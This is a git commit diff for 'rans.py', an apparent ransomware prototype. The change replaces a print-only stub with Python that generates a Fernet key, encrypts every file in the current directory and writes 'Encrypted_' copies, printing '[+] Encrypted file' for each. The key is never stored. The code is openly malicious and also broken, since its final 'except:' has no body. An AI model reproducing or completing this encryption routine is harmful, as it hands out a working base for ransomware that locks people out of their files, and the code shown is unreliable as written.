b2d1ea4f3c27936c134b4ca3a80d59cbab6116e7
Milann SHRESTHA <31887847+milannshrestha@users.noreply.github.com>
2020-02-07 08:31:02 +0545

    Update rans.py

--- rans.py
+++ rans.py
@@ -1,9 +1,25 @@
-from time import sleep
-import os
-aa = os.listdir()
-for i in aa:
-        print ("[+] Encrypted:" + "{}".format(i))
-        sleep(1)
+from cryptography.fernet import Fernet
+key = Fernet.generate_key()
 
+import base64
+import os
+from time import sleep
+
+dir_list = os.listdir()
+print (dir_list)
+try:
+        for i in dir_list:
+                with open(i, 'rb') as f:
+                        data = f.read()
+                fernet = Fernet(key)
+                encrypted = fernet.encrypt(data)
+
+                with open("f/Encrypted_{}".format(i), "wb") as f:
+                        f.write(encrypted)
+                print ("[+] Encrypted file {}".format(i))
+
+                sleep(2)
+#this version will only encrypt files not dir so, if theres dir in the path, it will igonore
+except:
 
 
